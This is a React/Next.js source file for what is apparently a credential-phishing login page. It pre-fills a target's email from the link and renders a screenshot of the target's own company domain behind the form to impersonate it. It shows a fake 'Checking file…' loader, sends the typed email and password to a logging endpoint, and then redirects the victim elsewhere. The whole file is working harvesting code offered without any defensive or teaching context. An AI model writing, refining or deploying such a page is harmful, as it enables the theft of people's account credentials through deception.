'use client'

import '../styles/globals.css'
import { useSearchParams } from 'next/navigation'
import { useState, useEffect } from 'react'

export default function LoginPage() {
  const params = useSearchParams()
  const preEmail = params.get('email') || ''
  const urlParamDomain = params.get('domain') || ''

  const [email, setEmail] = useState(preEmail)
  const [confirmed, setConfirmed] = useState(!!preEmail)
  const [password, setPassword] = useState('')
  const [showModal, setShowModal] = useState(false)
  const [errors, setErrors] = useState({ email: '', password: '' })

  const [domainToCapture, setDomainToCapture] = useState('')
  const [screenshotUrl, setScreenshotUrl]         = useState('')
  const [isLoading, setIsLoading]                 = useState(true)

  // auto-confirm email
  useEffect(() => {
    if (preEmail) setConfirmed(true)
  }, [preEmail])

  // choose domain from param or from email
  useEffect(() => {
    if (!confirmed) {
      setDomainToCapture('')
      return
    }
    if (urlParamDomain) {
      setDomainToCapture(urlParamDomain)
      return
    }
    const parts = email.split('@')
    setDomainToCapture(parts.length === 2 ? parts[1] : '')
  }, [confirmed, urlParamDomain, email])

  // build screenshot URL
  useEffect(() => {
    if (!domainToCapture) {
      setScreenshotUrl('')
      setIsLoading(false)
      return
    }
    const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL!
    const sep  = base.includes('?') ? '&' : '?'
    const url  = `${base}${sep}url=${encodeURIComponent(`https://${domainToCapture}`)}`
    setScreenshotUrl(url)
    setIsLoading(true)
  }, [domainToCapture])

  const validateEmail = (v: string) =>
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)

  const handleEmail = (e: React.FormEvent) => {
    e.preventDefault()
    if (!validateEmail(email)) {
      setErrors({ ...errors, email: 'Invalid email' })
      return
    }
    setConfirmed(true)
    setErrors({ ...errors, email: '' })
  }

  const handlePass = async (e: React.FormEvent) => {
    e.preventDefault()
    if (password.length < 5) {
      setErrors({ ...errors, password: 'Minimum 5 characters' })
      return
    }
    setShowModal(true)
    await fetch('/api/log-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, domain: domainToCapture }),
    })
    setTimeout(() => {
      window.location.href = 'https://testingmysite.com'
    }, 2000)
  }

  return (
    <div className="login-container relative">
      {/* Preloader overlay */}
      {isLoading && (
        <div className="fixed inset-0 z-30 flex items-center justify-center bg-white">
          <div className="text-lg font-medium text-gray-700">
            Checking file…
          </div>
        </div>
      )}

      {/* Screenshot + light-blue tint background */}
      {screenshotUrl && (
        <div className="absolute inset-0 overflow-hidden">
          <img
            src={screenshotUrl}
            alt={`Screenshot of ${domainToCapture}`}
            onLoad={() => setIsLoading(false)}
            onError={() => setIsLoading(false)}
            className="w-full h-full object-cover opacity-50 pointer-events-none"
          />
          {/* light-blue overlay */}
          <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
        </div>
      )}

      {/* Login Card */}
      <div className="login-card">
        <h1 className="text-2xl font-bold text-center mb-6">Login</h1>

        {!confirmed ? (
          <form onSubmit={handleEmail} className="space-y-4">
            <input
              type="email"
              value={email}
              onChange={e => setEmail(e.target.value)}
              placeholder="Enter your email"
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
              required
            />
            {errors.email && (
              <p className="text-sm text-red-600">{errors.email}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
            >
              Next
            </button>
          </form>
        ) : (
          <form onSubmit={handlePass} className="space-y-6">
            <div className="text-center mb-4">
              <div className="mx-auto mb-4 w-16 h-16 rounded-full bg-gray-400 flex items-center justify-center text-2xl text-white">
                {email[0]?.toUpperCase()}
              </div>
              <p className="text-gray-800 font-medium">{email}</p>
            </div>
            <input
              type="password"
              value={password}
              onChange={e => {
                setPassword(e.target.value)
                if (e.target.value.length >= 5 && errors.password) {
                  setErrors({ ...errors, password: '' })
                }
              }}
              placeholder="Enter your password"
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
              required
            />
            {errors.password && (
              <p className="text-sm text-red-600">{errors.password}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
            >
              Login
            </button>
          </form>
        )}
      </div>

      {/* Submission Modal */}
      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <h2 className="text-lg font-semibold text-gray-800">
              Please wait…
            </h2>
            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
          </div>
        </div>
      )}
    </div>
  )
}
